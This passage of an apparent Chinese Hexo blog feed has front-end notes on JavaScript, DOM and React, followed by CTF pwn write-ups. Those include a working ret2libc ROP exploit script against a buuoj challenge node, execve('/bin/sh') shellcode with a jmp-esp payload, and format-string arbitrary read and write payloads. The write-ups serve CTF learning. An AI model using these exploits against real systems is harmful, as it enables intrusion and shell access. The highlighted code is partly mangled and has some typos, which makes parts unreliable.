class="hljs-string">&quot;myForm&quot;</span>][<span class="hljs-string">&quot;fname&quot;</span>].<span class="hljs-property">value</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">if</span>(x == <span class="hljs-literal">null</span>||x == <span class="hljs-string">&quot;&quot;</span>)</span><br><span class="language-javascript">    &#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;姓必须填写&quot;</span>);</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myForm&quot;</span> <span class="hljs-attr">action</span> = <span class="hljs-string">&quot;demo.php&quot;</span> <span class="hljs-attr">onsubmit</span>=<span class="hljs-string">&quot;return validateForm()&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>姓:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span> = <span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span> = <span class="hljs-string">&quot;fname&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span> = <span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span> = <span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="JS的this"><a href="#JS的this" class="headerlink" title="JS的this"></a>JS的this</h3><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">在方法中，<span class="hljs-keyword">this</span>表示该方法所属的对象<br>fullName : function()&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.firstname + <span class="hljs-string">&quot; &quot;</span> + <span class="hljs-keyword">this</span>.lastname;<br>&#125;<br>单独使用，<span class="hljs-keyword">this</span>是全局对象<br>事件中的<span class="hljs-keyword">this</span><br>在HTML事件句柄中，<span class="hljs-keyword">this</span>指向了接收事件的HTML元素<br>&lt;button onclick=<span class="hljs-string">&quot;this.style.display =&#x27;none&#x27;&quot;</span>&gt;<br>点我后就消失咯<br>&lt;/button&gt;<br></code></pre></td></tr></table></figure><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><p>DOM(Document Object Model)<strong>文档对象模型</strong></p><h3 id="DOM节点"><a href="#DOM节点" class="headerlink" title="DOM节点"></a>DOM节点</h3><p>DOM节点树<br><img src="/2022/06/30/front/pe.png"><br>节点之间拥有层级关系<br>常用<strong>父</strong>，<strong>子</strong>，<strong>同胞</strong>等术语描述这些关系</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>DOM 教程<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>DOM 课程1<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Hello world!<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>此代码中<br>文本结点”hello world!”的父节点是<code>&lt;p&gt;</code>节点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs <h1>```与```<p>```节点是同胞结点">### DOM方法<br>HTML DOM方法是我们可以在节点（即HTML元素）上执行的动作<br>HTML DOM属性是我们可以在节点设置和修改的值<br>#### 编程接口<br>**getElementById()方法**<br></code></pre></td></tr></table></figure><p>var elemnt = document.getElementById(“intro”);</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">以及一些常用的方法<br></code></pre></td></tr></table></figure><p>appendChild(node)插入新的子节点<br>removeChild(node)删除字节点</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs clean">### DOM属性<br>**innerHTML属性**<br>获取元素内容的最简单的方法是使用innerHTML属性<br>innerHTML属性对于获取和替换HTML元素的内容很有用<br>注意**inner**<br>**nodeValue属性**<br>nodeValue属性规定节点的值<br>元素节点的nodeValue是undefined或null<br>文本节点的nodeValue是文本本身<br>属性节点的nodeValue是属性值<br>### DOM访问<br>访问HTML元素（节点）<br>**getElementById()方法**<br></code></pre></td></tr></table></figure><p>document.getElementById(“id”);</p><p id="intro">helloworld</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">id相对于，以起到寻找的作用<br>**<span class="hljs-built_in">getElementsByTagName</span>()方法**<br>该方法会选取所有该标签的<span class="hljs-selector-tag">HTML</span>元素<br></code></pre></td></tr></table></figure>document.getElementByTagName("p")<p>hello</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">**getElementsByClassName()方法**<br>### DOM修改<br>**修改HTML内容**<br></code></pre></td></tr></table></figure><script>document.getElementById("intro").innerHTML = "new words";</script><p id="intro"></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**修改HTML样式**</span><br></code></pre></td></tr></table></figure><p id="p1">Hello</p><p id="p2">hello</p><script>document.getElementById("p2").style.color = "red";document.getElementById("p2").style.fontFamily = "Arial";document.getElementById("p2").style.fontSize = "700";</script><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**添加新的HTML元素**</span><br></code></pre></td></tr></table></figure><div id="div1"><p id="p1">p1</p><p id="p2">p2</p></div><script>var para = document.createElement("p");var node = document.createTextNode("new para");para.appendChild(node);var element = document.getElementById("div1");element.appendChild(para);</script><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">### DOM元素<br>**创建新的<span class="hljs-selector-tag">HTML</span>元素<span class="hljs-built_in">-createElement</span>()**<br>如上方代码一样<br>先创建，再添加到已有的元素上<br>**<span class="hljs-built_in">insertBefore</span>()方法**<br>可以在指定元素节点之前添加该元素<br></code></pre></td></tr></table></figure>insertBefore(src,des)<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">注意记得为各个节点命名，方便操作<br>**<span class="hljs-built_in">replaceChild</span>()方法**<br>替换目标元素<br></code></pre></td></tr></table></figure>replaceBefore(src,des);<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>## React<br>### React部署<br>利用官方cdn链接<br></code></pre></td></tr></table></figure><script src="cdnurl"></script><script src="https://cdn.staticfile.org/react/16.4.0/umd/react.development.js"></script><script src="https://cdn.staticfile.org/react-dom/16.4.0/umd/react-dom.development.js"></script><script src="https://cdn.staticfile.org/babel-standalone/6.26.0/babel.min.js"></script><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mel"><br>实例中我们引入了三个库： react.development.<span class="hljs-keyword">min</span>.js 、react-dom.development.<span class="hljs-keyword">min</span>.js 和 babel.<span class="hljs-keyword">min</span>.js：<br>**react.<span class="hljs-keyword">min</span>.js**是核心库<br>**react-dom.<span class="hljs-keyword">min</span>.js**提供与DOM相关的功能<br>**babel.<span class="hljs-keyword">min</span>.js**Babel可以将ES6代码转为ES5，提高兼容性<br>### React元素渲染<br>#### 将元素渲染到DOM中<br>传递给<span class="hljs-string">``</span><span class="hljs-string">`ReactDOM.render()`</span><span class="hljs-string">``</span><br></code></pre></td></tr></table></figure>const element = <h1>HEllo</h1>ReactDOM.render(    element,    document.getElementById('example'));即可将element内容传给example为id的元素<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">#### 更新元素渲染<br>因为React元素是不可变的，修改时，需要用新元素进行替换<br></code></pre></td></tr></table></figure>function tick(){    const element = (        <div>            <h1>现在是{new Date().toLocateTimeString()}.</h1>        </div>     );     ReactDOM.render(         element,         document.getElementById('example')         );}<p>setInterval(tick,1000);</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">每<span class="hljs-number">1000</span>ms替换一次，达到计时效果<br>### React JSX<br>JSX是一种语法<br>在react中代替常规的JavaScript<br>如<br></code></pre></td></tr></table></figure><p>const element = </p><h1>HEllo</h1>;<p></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">**注意**<br>由于JSX是Javascript语言，故一些标识符如<span class="hljs-keyword">class</span>最好用<span class="hljs-symbol">className</span>代替<br></code></pre></td></tr></table></figure><p>var myDivElement = <div classname="foo">;</div></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">#### 在JSX中插入JS表达式<br></code></pre></td></tr></table></figure><p>ReactDOM.render(<br>    <div><br>        <h1>{i == 1 ? ‘True!’ : “False!”}</h1><br>    </div><br>    ,<br>    document.getElementById(‘example’)<br>);<br>就是JS套HTML再套JS的感觉</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">### React组件<br></code></pre></td></tr></table></figure><p>function HellowMessage(props){<br>    return </p><h1>HElloe world</h1>;<br>}<p></p><p>const element = <HelloMessage>;</HelloMessage></p><p>ReactDOM.render(<br>    element<br>    ,<br>    document.getElementById(‘example’)<br>    );</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><span class="hljs-strong">**第一步**</span><br>使用函数定义一个组件<br><br><span class="hljs-strong">**第二步**</span><br>用一个元素调用这个组件<br></code></pre></td></tr></table></figure><p>const element = <HelloMessage></HelloMessage></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">最后调用这个元素即可<br>#### 复合组件<br></code></pre></td></tr></table></figure><p>function Name(props) {<br>    return </p><h1>网站名称：{props.name}</h1>;<br>}<br>function Url(props) {<br>    return <h1>网站地址：{props.url}</h1>;<br>}<br>function Nickname(props) {<br>    return <h1>网站小名：{props.nickname}</h1>;<br>}<br>function App() {<br>    return (<br>    <div><br>        <Name name="菜鸟教程"><br>        <Url url="http://www.runoob.com"><br>        <Nickname nickname="Runoob"><br>    </Nickname></Url></Name></div><br>    );<br>}<p></p><p>ReactDOM.render(<br>     <App>,<br>    document.getElementById(‘example’)<br>);</App></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean">可以看出，用props.name时，传递参数要写，name =  <span class="hljs-string">&quot;...&quot;</span><br>### React State（状态）<br>#### 将生命周期方法添加到类中<br>如<br>每当Clock组件第一次加载到 DOM 中的时候，我们都想生成定时器，这在 React 中被称为挂载。<br><br>同样，每当 Clock 生成的这个 DOM 被移除的时候，我们也会想要清除定时器，这在 React 中被称为卸载。<br></code></pre></td></tr></table></figure><p>class Clock extends React.Component {<br>  constructor(props) {<br>    super(props);<br>    this.state = {date: new Date()};<br>  }</p><p>  componentDidMount() {<br>    this.timerID = setInterval(<br>      () =&gt; this.tick(),<br>      1000<br>    );<br>  }</p><p>  componentWillUnmount() {<br>    clearInterval(this.timerID);<br>  }</p><p>  tick() {<br>    this.setState({<br>      date: new Date()<br>    });<br>  }</p><p>  render() {<br>    return (<br>      <div><br>        <h1>Hello, world!</h1><br>        <h2>现在是 {this.state.date.toLocaleTimeString()}.</h2><br>      </div><br>    );<br>  }<br>}</p><p>ReactDOM.render(<br>  <Clock>,<br>  document.getElementById(‘example’)<br>);</Clock></p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pf">componentDidMount() 与 componentWillUnmount() 方法被称作生命周期钩子。<br><br>在组件输出到 DOM 后会执行 componentDidMount() 钩子，我们就可以在这个钩子上设置一个定时器。<br><br>this.timerID 为定时器的 ID，我们可以在 componentWillUnmount() 钩子中卸载定时器。代码执行顺序：<br><br>当 <span class="hljs-variable">&lt;Clock /&gt;</span> 被传递给 ReactDOM.render() 时，React 调用 Clock 组件的构造函数。 由于 Clock 需要显示当前时间，所以使用包含当前时间的对象来初始化 this.<span class="hljs-keyword">state</span> 。 我们稍后会更新此状态。<br><br>React 然后调用 Clock 组件的 render() 方法。这是 React 了解屏幕上应该显示什么内容，然后 React 更新 DOM 以匹配 Clock 的渲染输出。<br><br>当 Clock 的输出插入到 DOM 中时，React 调用 componentDidMount() 生命周期钩子。 在其中，Clock 组件要求浏览器设置一个定时器，每秒钟调用一次 tick()。<br><br>浏览器每秒钟调用 tick() 方法。 在其中，Clock 组件通过使用包含当前时间的对象调用 <span class="hljs-built_in">set</span>State() 来调度UI更新。 通过调用 <span class="hljs-built_in">set</span>State() ，React 知道状态已经改变，并再次调用 render() 方法来确定屏幕上应当显示什么。 这一次，render() 方法中的 this.<span class="hljs-keyword">state</span>.date 将不同，所以渲染输出将包含更新的时间，并相应地更新 DOM。<br><br>一旦 Clock 组件被从 DOM 中移除，React 会调用 componentWillUnmount() 这个钩子函数，定时器也就会被清除。<br><span class="hljs-comment">### React Props</span><br>props用于传递数据<br></code></pre></td></tr></table></figure><p>function HelloMe(props){<br>    return </p><h1>Hello {props.name}!</h1><br>}<p></p><p>const element= <HelloMe name="kasw">;</HelloMe></p><p>ReactDOM.render(<br>    element,<br>    document.getElementById(‘example’)<br>);</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### React 事件处理<br>HTML事件处理：<br></code></pre></td></tr></table></figure><button onclick="activateLasers()">激活按钮</button><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">React:</span><br></code></pre></td></tr></table></figure><button onclick="{activateLasers}">激活按钮</button><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">react中使用驼峰写法，且传入的是函数，而不是字符串<br>### React 条件渲染<br>登录界面判断<br>是输出**欢迎回来**<br>还是**请先注册**<br></code></pre></td></tr></table></figure>function UserGreeting(props) {  return <h1>欢迎回来!</h1>;}<p>function GuestGreeting(props) {<br>  return </p><h1>请先注册。</h1>;<br>}<br>function Greeting(props) {<br>  const isLoggedIn = props.isLoggedIn;<br>  if (isLoggedIn) {<br>    return <UserGreeting>;<br>  }<br>  return <GuestGreeting>;<br>}<p></p><p>ReactDOM.render(<br>  // 尝试修改 isLoggedIn={true}:<br>  <Greeting isloggedin="{false}">,<br>  document.getElementById(‘example’)<br>);<br>```</Greeting></p></GuestGreeting></UserGreeting></some-HTML-element>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>泄露出来的地址的处理</title>
    <link href="/2022/05/30/%E6%B3%84%E9%9C%B2%E5%87%BA%E6%9D%A5%E7%9A%84%E5%9C%B0%E5%9D%80%E7%9A%84%E5%A4%84%E7%90%86/"/>
    <url>/2022/05/30/%E6%B3%84%E9%9C%B2%E5%87%BA%E6%9D%A5%E7%9A%84%E5%9C%B0%E5%9D%80%E7%9A%84%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="一道简单的ROP题"><a href="#一道简单的ROP题" class="headerlink" title="一道简单的ROP题"></a>一道简单的ROP题</h1><h2 id="但是不是那么简单"><a href="#但是不是那么简单" class="headerlink" title="但是不是那么简单"></a>但是不是那么简单</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><pre><code class="hljs python3">from pwn import*<br>from LibcSearcher import*<br>p = remote(&#x27;node4.buuoj.cn&#x27;,28006)<br>#p = process(&#x27;./rop&#x27;)<br>elf = ELF(&#x27;./rop&#x27;)<br>put_plt_addr = elf.plt[&#x27;puts&#x27;]<br>put_got_addr = elf.got[&#x27;puts&#x27;]<br>vuln = 0x4006ad<br>pop_rdi = 0x400733<br><br><br>payload1 = b&#x27;A&#x27;*40 + p64(pop_rdi) + p64(put_got_addr) + p64(put_plt_addr) + p64(vuln)<br><br>p.recvuntil(&#x27;story!\n&#x27;)<br>p.sendline(payload1)<br><br>put_got = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))<br>print(hex(put_got))<br>libc = LibcSearcher(&#x27;puts&#x27;,put_got)<br>libc_base = put_got - libc.dump(&#x27;puts&#x27;)<br>sys = libc_base + libc.dump(&#x27;system&#x27;)<br>binsh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)<br><br><br>payload2 = b&#x27;A&#x27;*40 + p64(pop_rdi) + p64(binsh) + p64(sys)<br>p.recv()<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>接收返回的got地址时，使用</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recv</span>(<span class="hljs-number">6</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,&#x27;\x00&#x27;)<br># or<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recvline</span>()<span class="hljs-selector-class">.strip</span>()<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,&#x27;\x00&#x27;)<br></code></pre></td></tr></table></figure><p>是正确的<br>这样可以正确地补上两位\x00<br>而其他方法，保留\n的都是错误的，会导致地址错误！</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>shellcode</title>
    <link href="/2022/05/28/shellcode/"/>
    <url>/2022/05/28/shellcode/</url>
    
    <content type="html"><![CDATA[<h1 id="shellcode的利用"><a href="#shellcode的利用" class="headerlink" title="shellcode的利用"></a>shellcode的利用</h1><p>以国赛提前一天放出的模拟题为例<br>本文基于32位系统<br>打开题目后可以发现一下基础信息</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs mipsasm">没有开任何防护<br>没有开NX保护，意味着第一时间可以想到，把<span class="hljs-keyword">shellcode放在栈上运行</span><br><span class="hljs-keyword"></span>是<span class="hljs-number">32</span>位程序<br></code></pre></td></tr></table></figure><h2 id="shellcode-生成方法"><a href="#shellcode-生成方法" class="headerlink" title="shellcode 生成方法"></a>shellcode 生成方法</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">context</span><span class="hljs-params">(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, arch = <span class="hljs-string">&#x27;i386&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)</span></span><br>shellcode = <span class="hljs-built_in">asm</span>(shellcraft<span class="hljs-selector-class">.sh</span>())<br></code></pre></td></tr></table></figure><p>这样就可以生成一个shellcode<br><strong>注意：这样生成的shellcode长度为44，如果超过可以收容的大小，可能需要用其他方法编写shellcode</strong><br>以下为手动生成shellcode方法，大小为23，很小。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">shellcode =<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span>             #<span class="hljs-built_in">eax</span>置<span class="hljs-number">0</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">edx</span>#<span class="hljs-built_in">edx</span>置<span class="hljs-number">0</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>#将<span class="hljs-number">0</span>入栈，标记了”/bin/sh”的结尾<br><span class="hljs-keyword">push</span> <span class="hljs-number">0x68732f2f</span>         #传递”/sh”，为了<span class="hljs-number">4</span>字节对齐，使用//sh，这在execve()中等同于/sh<br><span class="hljs-keyword">push</span> <span class="hljs-number">0x6e69622f</span>         #传递“/bin”<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">esp</span>             #此时<span class="hljs-built_in">esp</span>指向了”/bin/sh”,通过<span class="hljs-built_in">esp</span>将该字符串的值传递给<span class="hljs-built_in">ebx</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">0xB</span>              #<span class="hljs-built_in">eax</span>置为execve函数的中断号<br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span>                #调用软中断<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode=asm（shellcode）<br></code></pre></td></tr></table></figure><p>关于int 0x80软中断</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">第一步，就是需要将系统调用号加入到<span class="hljs-built_in">eax</span>中。<br>第二步，<span class="hljs-built_in">ebx</span>保存函数调用的第一个参数，<span class="hljs-built_in">ecx</span>、<span class="hljs-built_in">edx</span>、<span class="hljs-built_in">esi</span>、<span class="hljs-built_in">edi</span>分别对应这<span class="hljs-number">2345</span>个参数。<br>如果参数超过<span class="hljs-number">5</span>个，就必须将参数数组存储在内存中，而且必须将该数组的地址放在<span class="hljs-built_in">ebx</span>中。<br>一旦加载寄存器后，就会调用<span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span> 汇编指令来中断，强迫内核暂停手头上的工作并处理该中断。<br></code></pre></td></tr></table></figure><h2 id="用ROPgadget获取jmp-esp地址"><a href="#用ROPgadget获取jmp-esp地址" class="headerlink" title="用ROPgadget获取jmp esp地址"></a>用ROPgadget获取jmp esp地址</h2><p>目的在于将返回值设置为jmp esp，可以返回esp然后执行传入的shellcode。</p><h2 id="最终的payload"><a href="#最终的payload" class="headerlink" title="最终的payload"></a>最终的payload</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">payload = shellcode.ljust(<span class="hljs-number">0x80</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>) + p32(addr_jmp_esp) + asm(<span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">esp</span>,<span class="hljs-title">offset</span></span>;call esp)<br><span class="hljs-comment">#关于这个asm(...),是手动启用栈，offset值为前面覆盖的数据长度+4。</span><br></code></pre></td></tr></table></figure><p>如此就可以利用一个没有保护，但是也没有system()的程序。<br><strong>注意shellcode在发送时不用p32包装！！</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>国赛</title>
    <link href="/2022/05/23/%E5%9B%BD%E8%B5%9B/"/>
    <url>/2022/05/23/%E5%9B%BD%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-格式化字符串漏洞"><a href="#0x01-格式化字符串漏洞" class="headerlink" title="0x01 格式化字符串漏洞"></a>0x01 格式化字符串漏洞</h1><h2 id="漏洞的产生原因及利用原理"><a href="#漏洞的产生原因及利用原理" class="headerlink" title="漏洞的产生原因及利用原理"></a>漏洞的产生原因及利用原理</h2><p>我们在正常的对格式化字符输出时大都使用printf(*format,*arg);<br>此种形式进行输出，但是部分程序员在开发的使用，为了省事使用了，printf(*format);进行输出<br>错误：<br>#include &lt;stdio.h&gt;<br>void main(){<br>    char str[1024];<br>    scanf(%s,&amp;str);<br>    printf(%s);<br>}</p><p>正确：<br>#include &lt;stdio.h&gt;<br>void main(){<br>    char str[1024];<br>    scanf(%s,&amp;str);<br>    printf(%s,str);<br>}</p><p>出现字符串格式化漏洞时，有如下方法</p><h3 id="任意地址泄露（读）"><a href="#任意地址泄露（读）" class="headerlink" title="任意地址泄露（读）"></a>任意地址泄露（读）</h3><p>任意地址读需要用到printf的另外一个特性,$操作符.这个操作符可以输出指定位置的参数.利用%n$x这样的字符串就可以获得对应的第n+1个参数的数值(因为格式化参数里边的n指的是格式化字符串对应的第n个输出参数,那么相对于输出函数来说就成了第n+1个).<br>先输入若干个数据确定偏移，比如AAAA%6$x，若输出为AAAA41414141时，就是达到了偏移量，此时偏移为6，若改为AAAA%7$x，脚本写为</p><blockquote></blockquote><p>conn.sendline(“%7$s”+p32(0x08048000))</p><p>会打印处0x0804800地址前几字段。<br>原因如下：此脚本中将p32(0x08048000)率先压入栈中，当其格式化串超出偏移值1个位置时，会读取栈上此地址，然后进行打印，看如下栈图。<br><img src="/2022/05/23/%E5%9B%BD%E8%B5%9B/p1.jpg"></p><h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>利用%n的特性，可以将已打印字符数传给后续传入的地址<br>如：<br>printf(“%.100d%n”,c,&amp;c);<br>可以打印100个c，然后将100赋值到c的地址处。</p><p>总结一下<br>payload核心在于，先计算出偏移值，再利用%kc%m$n进行修改</p><h3 id="攻防世界题-string（新手区）"><a href="#攻防世界题-string（新手区）" class="headerlink" title="攻防世界题 string（新手区）"></a>攻防世界题 